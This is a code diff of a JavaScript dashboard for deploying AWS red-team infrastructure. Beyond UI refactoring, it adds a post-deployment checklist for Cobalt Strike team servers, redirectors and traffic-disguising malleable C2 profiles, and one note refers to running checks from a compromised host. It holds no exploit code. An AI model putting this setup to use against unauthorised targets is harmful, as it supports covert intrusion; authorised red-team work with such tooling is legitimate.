-                <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 8px; font-size: 0.9em;">
-                    ${config.icon} ${config.label} (${typeResources.length})
+                <div style="font-weight: 500; color: var(--text-primary); margin-bottom: 8px; font-size: 0.9em; display: flex; align-items: center; gap: 6px;">
+                    ${awsIcon(type, 20)} ${config.label} (${typeResources.length})
                 </div>
                 <div style="font-size: 0.88em; color: var(--text-secondary);">
                     ${typeResources.map(r => r.name || r.id).join(', ')}
@@ -8363,30 +14759,6 @@ function buildResourcesSection(resources, title, icon, color, action) {
         return '';
     }
     
-    const typeIcons = {
-        'vpc': '🌐',
-        'subnet': '📡',
-        'security_group': '🔒',
-        'sg': '🔒',
-        'ec2': '🖥️',
-        'instance': '🖥️',
-        'nat_gateway': '🚪',
-        'nat': '🚪',
-        'internet_gateway': '🌍',
-        'igw': '🌍',
-        'elastic_ip': '🔗',
-        'eip': '🔗',
-        'route_table': '🛣️',
-        'rtb': '🛣️',
-        'network_interface': '🔌',
-        'eni': '🔌',
-        'key_pair': '🔑',
-        's3_bucket': '📦',
-        'iam_role': '👤',
-        'iam_instance_profile': '🎭',
-        'default': '📄'
-    };
-    
     // Group resources by type
     const grouped = {};
     resources.forEach(r => {
@@ -8394,12 +14766,12 @@ function buildResourcesSection(resources, title, icon, color, action) {
         if (!grouped[type]) grouped[type] = [];
         grouped[type].push(r);
     });
-    
+
     const resourceRows = Object.entries(grouped).map(([type, items]) => {
-        const typeIcon = typeIcons[type.replace(/ /g, '_')] || typeIcons['default'];
+        const typeKey = type.replace(/ /g, '_');
         return items.map(item => `
             <div style="display: flex; align-items: center; gap: 10px; padding: 8px 12px; background: ${action === 'created' ? 'var(--success-bg)' : 'var(--danger-bg)'}; border-radius: 6px; margin-bottom: 6px;">
-                <span style="font-size: 1.1em;">${typeIcon}</span>
+                <span>${awsIcon(typeKey, 22)}</span>
                 <div style="flex: 1; min-width: 0;">
                     <div style="font-weight: 500; color: var(--text-primary); font-size: 0.88em; text-transform: capitalize;">${type.replace(/_/g, ' ')}</div>
                     <div style="font-size: 0.8em; color: var(--text-secondary); overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">${item.name || item.id || 'Unknown'}</div>
@@ -8426,32 +14798,68 @@ function buildResourcesSection(resources, title, icon, color, action) {
  * Toggle session expansion
  */
 function toggleSessionExpand(sessionId) {
-    if (expandedSessions.has(sessionId)) {
+    const wasExpanded = expandedSessions.has(sessionId);
+    if (wasExpanded) {
         expandedSessions.delete(sessionId);
     } else {
         expandedSessions.add(sessionId);
     }
     renderDeploymentTimeline();
+
+    // Auto-load connection info and credentials when expanding
+    // C2 deployments render connection info inline from cached data (instant)
+    // GOAD deployments need the slow /deploy/outputs API call
+    if (!wasExpanded) {
+        const sessionKey = sessionId.replace('session-', '');
+        const parts = sessionKey.split('-');
+        // Session key is either date-prefixed (YYYY-MM-DD-project) or the project name directly
+        const projectName = parts.length > 3 ? parts.slice(3).join('-') : (/^\d{4}-\d{2}-\d{2}$/.test(sessionKey) ? null : sessionKey);
+        if (projectName) {
+            // Check if this is a GOAD deployment that needs lazy-loaded connection info
+            const contentDiv = document.getElementById(`${sessionId}-connection-content`);
+            if (contentDiv && contentDiv.textContent.trim() === 'Loading connection details...') {
+                loadConnectionInfo(projectName, sessionId);
+            }
+            loadCredentials(projectName, sessionId);
+            // Auto-load SSL & DNS status for C2 deployments
+            // Use setTimeout(0) to ensure the DOM from renderDeploymentTimeline() is fully committed
+            setTimeout(() => autoLoadSSLStatus(), 0);
+        }
+    }
 }
 
 /**
  * Show full logs for a specific session in a modal
  */
 function showSessionLogs(sessionKey) {
-    // sessionKey is either "date" or "date-projectName"
-    const parts = sessionKey.split('-');
-    const date = parts.slice(0, 3).join('-'); // YYYY-MM-DD
-    const projectName = parts.length > 3 ? parts.slice(3).join('-') : null;
-    
-    // Filter logs by date and optionally by project name
+    // sessionKey is either a date "YYYY-MM-DD" or a project name like "c2-adhoc-dev-myproject"
+    // Detect which format by checking if it starts with a date pattern
+    const isDateKey = /^\d{4}-\d{2}-\d{2}/.test(sessionKey);
+    let date, projectName;
+
+    if (isDateKey) {
+        const parts = sessionKey.split('-');
+        date = parts.slice(0, 3).join('-');
+        projectName = parts.length > 3 ? parts.slice(3).join('-') : null;
+    } else {
+        // sessionKey is a project name — match logs by project_name
+        date = null;
+        projectName = sessionKey;
+    }
+
+    // Filter logs by date and/or project name
     const sessionLogs = deploymentLogs.filter(log => {
-        const matchesDate = log.timestamp.startsWith(date);
-        if (!matchesDate) return false;
+        if (date && !log.timestamp.startsWith(date)) return false;
         if (projectName) {
             return log.project_name === projectName;
         }
         return true;
     });
+
+    // Derive display date from first log if we matched by project name
+    if (!date && sessionLogs.length > 0) {
+        date = sessionLogs[0].timestamp.split('T')[0];
+    }
     
     if (sessionLogs.length === 0) {
         alert('No logs found for this session.');
@@ -8469,10 +14877,10 @@ function showSessionLogs(sessionKey) {
     `;
     
     const levelColors = {
-        'info': 'var(--accent-muted)',
-        'success': 'var(--success-text)',
-        'warning': 'var(--warning-text)',
-        'error': 'var(--danger-text)'
+        'info': '#8BB4D9',
+        'success': '#7ECF8C',
+        'warning': '#E8C56D',
+        'error': '#F08A84'
     };
     
     modal.innerHTML = `
@@ -8484,13 +14892,13 @@ function showSessionLogs(sessionKey) {
             <div style="flex: 1; overflow-y: auto; padding: 15px; font-family: 'SF Mono', Monaco, monospace; font-size: 0.88em; line-height: 1.6;">
                 ${sessionLogs.map(log => {
                     const time = new Date(log.timestamp).toLocaleTimeString();
-                    const color = levelColors[log.level] || 'var(--text-secondary)';
+                    const color = levelColors[log.level] || '#B0B8CC';
                     // Clean ANSI codes
                     const cleanMsg = log.message.replace(/\x1b\[[0-9;]*m/g, '');
                     return `<div style="margin-bottom: 6px; padding: 4px 0; border-bottom: 1px solid rgba(255,255,255,0.05);">
-                        <span style="color: var(--text-muted);">[${time}]</span>
+                        <span style="color: #7A849E;">[${time}]</span>
                         <span style="color: ${color}; background: ${color}20; padding: 1px 6px; border-radius: 3px; font-size: 0.8em; margin: 0 8px;">${log.level.toUpperCase()}</span>
-                        <span style="color: var(--text-secondary);">${cleanMsg}</span>
+                        <span style="color: #B0B8CC;">${cleanMsg}</span>
                     </div>`;
                 }).join('')}
             </div>
@@ -8557,33 +14965,39 @@ function renderDeploymentLogs() {
     });
     
     if (filtered.length === 0) {
-        logsDiv.innerHTML = '<div style="color: var(--text-muted);">No logs match the current filter</div>';
+        logsDiv.innerHTML = '<div class="t-muted">No logs match the current filter</div>';
         return;
     }
     
+    // Hardcoded colors for dark terminal background (light mode safe)
     const levelColors = {
-        'info': 'var(--info-text)',
-        'success': 'var(--success-text)',
-        'warning': 'var(--warning-text)',
-        'error': 'var(--danger-text)'
+        'info': '#6CB4EE',
+        'success': '#7ECF8C',
+        'warning': '#E8C56D',
+        'error': '#F08A84'
     };
-    
+
+    // Capture scroll position before replacing content so we don't hijack
+    // the user's position when they're reading older entries.
+    const wasNearBottom = (logsDiv.scrollTop + logsDiv.clientHeight >= logsDiv.scrollHeight - 40);
+
     logsDiv.innerHTML = filtered.slice(-100).reverse().map(log => {
         const time = formatTimestamp(log.timestamp);
-        const color = levelColors[log.level] || 'var(--text-muted)';
+        const color = levelColors[log.level] || '#7A849E';
         const levelBadge = `<span style="color: ${color}; font-weight: bold;">[${log.level.toUpperCase()}]</span>`;
-        
-        let html = `<div style="margin-bottom: 8px;"><span style="color: var(--text-muted);">${time}</span> ${levelBadge} <span style="color: var(--text-primary);">${escapeHtml(log.message)}</span></div>`;
-        
+
+        let html = `<div style="margin-bottom: 8px;"><span style="color: #7A849E;">${time}</span> ${levelBadge} <span style="color: #D0D6E0;">${escapeHtml(log.message)}</span></div>`;
+
         if (log.details) {
-            html += `<div style="margin-left: 20px; margin-bottom: 12px; padding: 8px; background: var(--bg-container); border-radius: 4px; color: var(--text-muted); font-size: 0.9em; white-space: pre-wrap;">${escapeHtml(log.details)}</span></div>`;
+            html += `<div style="margin-left: 20px; margin-bottom: 12px; padding: 8px; background: rgba(255,255,255,0.05); border-radius: 4px; color: #9DA5B4; font-size: 0.9em; white-space: pre-wrap;">${escapeHtml(log.details)}</div>`;
         }
-        
+
         return html;
     }).join('');
-    
-    // Scroll to bottom
-    logsDiv.scrollTop = logsDiv.scrollHeight;
+
+    if (wasNearBottom) {
+        logsDiv.scrollTop = logsDiv.scrollHeight;
+    }
 }
 
 /**
@@ -8649,15 +15063,15 @@ function clearDeploymentLogs() {
         deploymentLogs = deploymentLogs.filter(log => log.project_name && activeSet.has(log.project_name));
         saveDeploymentLogs();
         // Set cleared-at timestamp so server merge doesn't re-add old entries
-        localStorage.setItem('red_team_logs_cleared_at', new Date().toISOString());
+        localStorage.setItem(getClearedAtKey(), new Date().toISOString());
     } else {
         if (!confirm('Clear all deployment logs?\n\nNo active deployments found. All logs will be cleared.\nArchive is always preserved via "Archived Logs".')) {
             return;
         }
         deploymentLogs = [];
-        localStorage.removeItem(LOGS_STORAGE_KEY);
+        localStorage.removeItem(getLogsStorageKey());
         // Set cleared-at timestamp so server merge doesn't re-add old entries
-        localStorage.setItem('red_team_logs_cleared_at', new Date().toISOString());
+        localStorage.setItem(getClearedAtKey(), new Date().toISOString());
     }
 
     renderDeploymentTimeline();
@@ -8927,38 +15341,38 @@ function viewArchivedLogs() {
                 // Build summary section
                 let summaryItems = [];
                 if (facts.deploymentType) {
-                    summaryItems.push(`<span style="color: var(--info-text);">Deployment Type:</span> ${escapeHtml(facts.deploymentType)}`);
+                    summaryItems.push(`<span class="t-info">Deployment Type:</span> ${escapeHtml(facts.deploymentType)}`);
                 }
                 if (facts.workspace) {
-                    summaryItems.push(`<span style="color: var(--info-text);">Workspace:</span> ${escapeHtml(facts.workspace)}`);
+                    summaryItems.push(`<span class="t-info">Workspace:</span> ${escapeHtml(facts.workspace)}`);
                 }
                 if (facts.deployDuration) {
-                    summaryItems.push(`<span style="color: var(--success-text);">Deploy Duration:</span> ${escapeHtml(facts.deployDuration)}`);
+                    summaryItems.push(`<span class="t-success">Deploy Duration:</span> ${escapeHtml(facts.deployDuration)}`);
                 }
                 if (facts.resourcesCreated > 0) {
-                    summaryItems.push(`<span style="color: var(--success-text);">Resources Created:</span> ${facts.resourcesCreated}`);
+                    summaryItems.push(`<span class="t-success">Resources Created:</span> ${facts.resourcesCreated}`);
                 }
                 if (facts.s3Uploads.length > 0) {
-                    summaryItems.push(`<span style="color: var(--success-text);">S3 Uploads:</span> ${facts.s3Uploads.map(u => escapeHtml(u)).join(', ')}`);
+                    summaryItems.push(`<span class="t-success">S3 Uploads:</span> ${facts.s3Uploads.map(u => escapeHtml(u)).join(', ')}`);
                 }
                 if (facts.resourcesDestroyed > 0) {
-                    summaryItems.push(`<span style="color: var(--text-muted);">Resources Destroyed:</span> ${facts.resourcesDestroyed}`);
+                    summaryItems.push(`<span class="t-muted">Resources Destroyed:</span> ${facts.resourcesDestroyed}`);
                 }
                 if (facts.resourcesRemaining > 0) {
-                    summaryItems.push(`<span style="color: var(--warning-text);">Resources Remaining:</span> ${facts.resourcesRemaining}`);
+                    summaryItems.push(`<span class="t-warning">Resources Remaining:</span> ${facts.resourcesRemaining}`);
                 }
                 if (facts.instancesStopped > 0) {
-                    summaryItems.push(`<span style="color: var(--warning-text);">Instances Stopped:</span> ${facts.instancesStopped}${facts.stoppedNames.length ? ' (' + facts.stoppedNames.map(n => escapeHtml(n)).join(', ') + ')' : ''}`);
+                    summaryItems.push(`<span class="t-warning">Instances Stopped:</span> ${facts.instancesStopped}${facts.stoppedNames.length ? ' (' + facts.stoppedNames.map(n => escapeHtml(n)).join(', ') + ')' : ''}`);
                 }
                 if (facts.instancesStarted > 0) {
-                    summaryItems.push(`<span style="color: var(--success-text);">Instances Started:</span> ${facts.instancesStarted}${facts.startedNames.length ? ' (' + facts.startedNames.map(n => escapeHtml(n)).join(', ') + ')' : ''}`);
+                    summaryItems.push(`<span class="t-success">Instances Started:</span> ${facts.instancesStarted}${facts.startedNames.length ? ' (' + facts.startedNames.map(n => escapeHtml(n)).join(', ') + ')' : ''}`);
                 }
                 if (facts.errors.length > 0) {
-                    summaryItems.push(`<span style="color: var(--danger-text);">Errors:</span> ${facts.errors.length}`);
+                    summaryItems.push(`<span class="t-danger">Errors:</span> ${facts.errors.length}`);
                 }
 
                 const summaryHtml = summaryItems.length > 0 ? `
-                    <div style="background: rgba(255,255,255,0.04); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
+                    <div style="background: var(--bg-card); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
                         <div style="font-weight: 600; color: var(--text-secondary); font-size: 0.82em; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Session Summary</div>
                         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 6px 20px;">
                             ${summaryItems.map(item => `<div style="font-size: 0.82em; color: var(--text-primary);">${item}</div>`).join('')}
@@ -8968,7 +15382,7 @@ function viewArchivedLogs() {
 
                 // Destroyed resources list
                 const destroyedListHtml = facts.destroyedResources.length > 0 ? `
-                    <div style="background: rgba(255,255,255,0.04); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
+                    <div style="background: var(--bg-card); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
                         <div style="font-weight: 600; color: var(--text-muted); font-size: 0.82em; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Destroyed Resources (${facts.destroyedResources.length})</div>
                         <div style="font-family: monospace; font-size: 0.78em; color: var(--text-secondary); max-height: 120px; overflow-y: auto;">
                             ${facts.destroyedResources.map(r => `<div style="padding: 2px 0;">&#8226; ${escapeHtml(r)}</div>`).join('')}
@@ -8978,10 +15392,10 @@ function viewArchivedLogs() {
 
                 // Error details
                 const errorListHtml = facts.errors.length > 0 ? `
-                    <div style="background: rgba(240,138,132,0.08); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
+                    <div style="background: var(--danger-bg); border-radius: 8px; padding: 12px 16px; margin-bottom: 12px;">
                         <div style="font-weight: 600; color: var(--danger-text); font-size: 0.82em; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px;">Errors (${facts.errors.length})</div>
                         <div style="font-size: 0.8em; color: var(--danger-text); max-height: 100px; overflow-y: auto;">
-                            ${facts.errors.map(e => `<div style="padding: 3px 0; border-bottom: 1px solid rgba(240,138,132,0.1);">${escapeHtml(e)}</div>`).join('')}
+                            ${facts.errors.map(e => `<div style="padding: 3px 0; border-bottom: 1px solid var(--danger-border);">${escapeHtml(e)}</div>`).join('')}
                         </div>
                     </div>
                 ` : '';
@@ -8990,7 +15404,7 @@ function viewArchivedLogs() {
                 const rawLogsHtml = s.logs.map(log => {
                     const time = new Date(log.timestamp).toLocaleTimeString();
                     return `
-                        <div style="padding: 6px 10px; margin-bottom: 4px; background: rgba(255,255,255,0.02); border-radius: 4px; border-left: 2px solid ${levelColors[log.level] || 'var(--text-muted)'};">
+                        <div style="padding: 6px 10px; margin-bottom: 4px; background: var(--bg-card); border-radius: 4px; border-left: 2px solid ${levelColors[log.level] || 'var(--text-muted)'};">
                             <div style="display: flex; justify-content: space-between; margin-bottom: 2px;">
                                 <span style="color: ${levelColors[log.level] || 'var(--text-primary)'}; font-weight: 500; font-size: 0.78em;">
                                     ${levelIcons[log.level] || ''} ${log.level.toUpperCase()}
@@ -9004,7 +15418,7 @@ function viewArchivedLogs() {
                 }).join('');
 
                 expandedContent = `
-                    <div style="background: var(--bg-terminal); border-radius: 0 0 8px 8px; padding: 16px; border-left: 5px solid ${statusColor}; max-height: 400px; overflow-y: auto;">
+                    <div style="background: var(--bg-section); border-radius: 0 0 8px 8px; padding: 16px; border-left: 5px solid ${statusColor}; max-height: 400px; overflow-y: auto;">
                         ${summaryHtml}
                         ${destroyedListHtml}
                         ${errorListHtml}
@@ -9049,20 +15463,20 @@ function viewArchivedLogs() {
 
         return `
             <div style="background: var(--bg-container); border-radius: 12px; max-width: 900px; width: 100%; max-height: 80vh; overflow: hidden; display: flex; flex-direction: column;">
-                <div style="padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center;">
-                    <h2 style="margin: 0; color: white;">Archived Logs <span style="color: var(--text-muted); font-size: 0.6em; font-weight: 400;">${sessionList.length} sessions &middot; ${archivedLogs.length} events</span></h2>
-                    <button onclick="closeArchivedLogsModal()" style="background: none; border: none; color: white; font-size: 24px; cursor: pointer;">&times;</button>
+                <div style="padding: 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
+                    <h2 style="margin: 0; color: var(--text-primary); font-weight: 700;">Archived Logs <span style="color: var(--text-muted); font-size: 0.6em; font-weight: 400;">${sessionList.length} sessions &middot; ${archivedLogs.length} events</span></h2>
+                    <button onclick="closeArchivedLogsModal()" style="background: none; border: none; color: var(--text-primary); font-size: 24px; cursor: pointer;">&times;</button>
                 </div>
 
                 <div id="archived-logs-content" style="flex: 1; overflow-y: auto; padding: 20px;">
                     ${sessionCards}
                 </div>
 
-                <div style="padding: 15px 20px; border-top: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center;">
+                <div style="padding: 15px 20px; border-top: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;">
                     <button onclick="clearArchivedLogs()" style="padding: 8px 16px; background: transparent; border: 1px solid var(--danger); border-radius: 6px; color: var(--danger); cursor: pointer; font-size: 0.9em;">
                         Clear Archive
                     </button>
-                    <button onclick="downloadArchivedLogs()" style="padding: 8px 16px; background: var(--brand); border: none; border-radius: 6px; color: white; cursor: pointer; font-size: 0.9em;">
+                    <button onclick="downloadArchivedLogs()" style="padding: 8px 16px; background: var(--brand); border: none; border-radius: 6px; color: var(--text-inverse); cursor: pointer; font-size: 0.9em;">
                         Download All
                     </button>
                 </div>
@@ -9099,7 +15513,7 @@ function clearArchivedLogs() {
         return;
     }
     archivedLogs = [];
-    localStorage.removeItem(ARCHIVED_LOGS_KEY);
+    localStorage.removeItem(getArchivedLogsKey());
     closeArchivedLogsModal();
     showMessage('Archived logs cleared', 'success');
 }
@@ -9173,6 +15587,510 @@ function formatTimestamp(timestamp) {
     });
 }
 
+/**
+ * Render C2 connection info HTML from cached infra/config data (no API call)
+ */
+/**
+ * Build a numbered post-deployment checklist for C2 deployments.
+ * Uses cached infrastructure data to populate real IPs and commands.
+ */
+function buildPostDeployChecklist(sessionId, projectData) {
+    if (!projectData) return '';
+
+    const bastion = projectData.bastion || {};
+    const bastionIp = bastion.public_ip || '<BASTION_IP>';
+    const c2Servers = projectData.c2_servers || {};
+    const servers = c2Servers.servers || {};
+    const serverIps = c2Servers.private_ips || [];
+    const c2Ip = Object.values(servers)[0]?.private_ip || serverIps[0] || '<C2_PRIVATE_IP>';
+    const redirectors = projectData.redirectors || {};
+    const redirPublicIps = redirectors.public_ips || [];
+    const redirIp = redirPublicIps[0] || '<REDIRECTOR_IP>';
+    const attackBox = projectData.attack_box || {};
+    const config = projectData.config || {};
+    const primaryDomain = config.redirector_domain || config.primary_domain_name || '';
+    const c2Sub = config.c2_subdomain || 'api';
+    const domain = primaryDomain ? `${c2Sub}.${primaryDomain}` : '<YOUR_DOMAIN>';
+    const csPassword = config.cs_teamserver_password || '';
+    const csLicenseKey = config.cobalt_strike_license_secret_name || '';
+
+    // Resolve SSH key path
+    let keyPath = '~/.ssh/your_key';
+    if (cachedSshKeyData) {
+        const comment = cachedSshKeyData.comment || '';
+        const keyType = cachedSshKeyData.key_type || '';
+        if (comment.includes('/.ssh/')) {
+            keyPath = comment.trim();
+        } else if (comment.match(/^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+$/)) {
+            keyPath = keyType === 'ssh-ed25519' ? '~/.ssh/id_ed25519' : '~/.ssh/id_rsa';
+        } else if (comment && !comment.includes('@') && !comment.includes(' ')) {
+            keyPath = `~/.ssh/${comment}`;
+        }
+    }
+
+    const stepStyle = 'margin-bottom: 16px; padding: 14px; background: var(--bg-section); border-radius: 6px;';
+    const numStyle = 'display: inline-flex; align-items: center; justify-content: center; width: 24px; height: 24px; background: var(--brand); color: white; border-radius: 50%; font-size: 0.82em; font-weight: 700; margin-right: 8px; flex-shrink: 0;';
+    const noteStyle = 'margin: 8px 0 0 0; font-size: 0.85em; color: var(--text-muted);';
+
+    let steps = '';
+    let stepNum = 1;
+
+    // Step 1: Clear stale SSH known hosts (avoids REMOTE HOST IDENTIFICATION HAS CHANGED errors)
+    const hostsToClean = [bastionIp, c2Ip, ...redirPublicIps].filter(ip => ip && !ip.startsWith('<'));
+    if (hostsToClean.length > 0) {
+        const cleanCmds = hostsToClean.map(ip => `ssh-keygen -R ${ip}`).join(' && ');
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Clear Stale SSH Host Keys</strong>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">If you previously deployed to the same IPs, old host keys will cause a <code style="background: var(--bg-terminal); color: #F08A84; padding: 2px 6px; border-radius: 3px;">REMOTE HOST IDENTIFICATION HAS CHANGED</code> error. Run this to clear them:</p>
+                ${renderCopyableCommand('Remove old host keys:', cleanCmds)}
+                <p style="${noteStyle}">Safe to run even if no old keys exist. New keys will be accepted on first connect.</p>
+            </div>`;
+        stepNum++;
+    }
+
+    // Step: Activate CS license on the team server
+    if (!csLicenseKey) {
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Activate Cobalt Strike License</strong>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">SSH to the C2 team server and activate your license. This downloads the licensed binaries.</p>
+                ${renderCopyableCommand('SSH to C2 via bastion:', `ssh -J ubuntu@${bastionIp} -i ${keyPath} ubuntu@${c2Ip}`)}
+                ${renderCopyableCommand('Run the updater:', `cd /opt/cobaltstrike && sudo ./update`)}
+                <p style="${noteStyle}">Enter your license key when prompted. This only needs to be done once.</p>
+            </div>`;
+    } else {
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Cobalt Strike License</strong>
+                    <span style="margin-left: 8px; background: var(--success-bg); color: var(--success-text); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Pre-activated</span>
+                </div>
+                <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">License was automatically activated during deployment via AWS Secrets Manager.</p>
+                <p style="${noteStyle}">If activation failed, check the log: <code class="code-inline">cat /var/log/cs-install.log</code> — or activate manually: <code class="code-inline">cd /opt/cobaltstrike && sudo ./update</code></p>
+            </div>`;
+    }
+    stepNum++;
+
+    // Step: Set team server password (only if not pre-set)
+    if (!csPassword) {
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Set Team Server Password & Start Server</strong>
+                </div>
+                <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">SSH to the C2 team server${csLicenseKey ? '' : ' (if not already connected from the previous step)'} and set a password to start the team server on port 50050.</p>
+                ${renderCopyableCommand('SSH to C2 via bastion:', `ssh -J ubuntu@${bastionIp} -i ${keyPath} ubuntu@${c2Ip}`)}
+                ${renderCopyableCommand('Set password & start server:', `sudo /opt/cobaltstrike/set-password.sh`)}
+                <p style="${noteStyle}">The script prompts for a password, updates the systemd service, and starts the server.</p>
+            </div>`;
+    } else {
+        steps += `
+            <div style="${stepStyle}">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Team Server Password</strong>
+                    <span style="margin-left: 8px; background: var(--success-bg); color: var(--success-text); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Pre-set</span>
+                </div>
+                <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">Password was configured during deployment. ${csLicenseKey ? 'The team server started automatically during deployment.' : 'The team server will start automatically after license activation.'}</p>
+                <p style="${noteStyle}">To change it later: <code class="code-inline">sudo /opt/cobaltstrike/set-password.sh</code></p>
+            </div>`;
+    }
+    stepNum++;
+
+    // Step: Connect CS client
+    steps += `
+        <div style="${stepStyle}">
+            <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                <span style="${numStyle}">${stepNum}</span>
+                <strong style="font-size: 0.95em;">Connect Cobalt Strike Client</strong>
+            </div>
+            <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">From your local machine, create an SSH tunnel to the team server, then connect your CS client.</p>
+            ${renderCopyableCommand('Start SSH tunnel (run locally):', `ssh -L 50050:${c2Ip}:50050 -i ${keyPath} ubuntu@${bastionIp}`)}
+            <p style="margin: 8px 0 0 0; font-size: 0.9em; color: var(--text-secondary);">With the tunnel running, open your CS client and connect to:</p>
+            <div style="text-align: center; padding: 10px; background: var(--bg-terminal); border-radius: 4px; margin-top: 6px;">
+                <code style="font-size: 1.1em; font-weight: 600; color: var(--text-terminal);">localhost:50050</code>
+            </div>
+        </div>`;
+    stepNum++;
+
+    // Step: DNS (wait for propagation)
+    steps += `
+        <div style="${stepStyle}">
+            <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                <span style="${numStyle}">${stepNum}</span>
+                <strong style="font-size: 0.95em;">Verify DNS Propagation</strong>
+            </div>
+            <p style="margin: 0 0 8px 0; font-size: 0.9em; color: var(--text-secondary);">If using a custom domain, ensure DNS has propagated. Route 53 name servers were configured during deployment.</p>
+            ${renderCopyableCommand('Linux / macOS / WSL:', `dig +short ${domain}`)}
+            ${renderCopyableCommand('PowerShell:', `Resolve-DnsName ${domain} -Type A | Select-Object IPAddress`)}
+            ${renderCopyableCommand('CMD:', `nslookup ${domain}`)}
+            <p style="${noteStyle}">Run this from the <strong>target network</strong> (e.g. via beacon shell or compromised host), not your operator laptop. The blue team's DNS blocklist affects the target estate, not your home network. Should return your active redirector IP(s). If a redirector was disabled via the DNS toggle, its IP should no longer appear.</p>
+        </div>`;
+    stepNum++;
+
+    // Step: SSL certificates (automatic — managed via SSL & DNS Status section)
+    steps += `
+        <div style="${stepStyle}">
+            <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                <span style="${numStyle}">${stepNum}</span>
+                <strong style="font-size: 0.95em;">SSL Certificates</strong>
+                <span style="margin-left: 8px; background: var(--success-bg); color: var(--success-text); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Automatic</span>
+            </div>
+            <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">Each redirector automatically requests a Let's Encrypt certificate via DNS-01 at boot. Check the <strong>SSL & DNS Status</strong> section below for live certificate status and DNS toggles.</p>
+        </div>`;
+    stepNum++;
+
+    // Step: Redirector URI configuration
+    const malleableProfile = config.malleable_profile || 'default';
+    const knownProfiles = ['default', 'amazon', 'google', 'microsoft', 'wikipedia'];
+    const profileLabels = { default: 'jQuery (Default)', amazon: 'Amazon CDN', google: 'Google APIs', microsoft: 'Microsoft Azure', wikipedia: 'Wikipedia' };
+    const isAutoConfigured = knownProfiles.includes(malleableProfile);
+
+    if (malleableProfile === 'default' || malleableProfile === '') {
+        // Default jQuery profile: fully automated (profile + nginx)
+        steps += `
+            <div style="${stepStyle} border-left: 3px solid var(--success);">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Malleable C2 Profile & Redirector URIs</strong>
+                    <span style="margin-left: 8px; background: var(--success-bg); color: var(--success-text); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Fully Automated</span>
+                </div>
+                <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">The <strong>jQuery</strong> malleable profile (<a href="https://github.com/threatexpress/malleable-c2" target="_blank" style="color: var(--brand);">threatexpress/malleable-c2</a>) was auto-loaded on the team server and nginx redirectors are pre-configured to match its URIs. No manual configuration needed.</p>
+                <p style="${noteStyle}">c2lint was run automatically during deployment. Check results: <code class="code-inline">cat /var/log/cs-install.log | grep -A5 c2lint</code></p>
+                <p style="${noteStyle}">Profile location: <code class="code-inline">/opt/cobaltstrike/profiles/jquery.profile</code> &mdash; Re-run manually: <code class="code-inline">cd /opt/cobaltstrike/server && ./c2lint /opt/cobaltstrike/profiles/jquery.profile</code></p>
+            </div>`;
+    } else if (isAutoConfigured) {
+        // Non-default preset (amazon, google, microsoft): fully automated — profile embedded in install script
+        steps += `
+            <div style="${stepStyle} border-left: 3px solid var(--success);">
+                <div style="display: flex; align-items: center; margin-bottom: 8px;">
+                    <span style="${numStyle}">${stepNum}</span>
+                    <strong style="font-size: 0.95em;">Malleable C2 Profile — ${profileLabels[malleableProfile]}</strong>
+                    <span style="margin-left: 8px; background: var(--success-bg); color: var(--success-text); padding: 2px 8px; border-radius: 4px; font-size: 0.75em;">Fully Automated</span>
+                </div>
+                <p style="margin: 0; font-size: 0.9em; color: var(--text-secondary);">The <strong>${profileLabels[malleableProfile]}</strong> malleable profile was auto-loaded on the team server (with full OPSEC hardening) and nginx redirectors are pre-configured to match its URIs. No manual configuration needed.</p>
+                <p style="${noteStyle}">c2lint was run automatically during deployment. Check results: <code class="code-inline">cat /var/log/cs-install.log | grep -A5 c2lint</code></p>
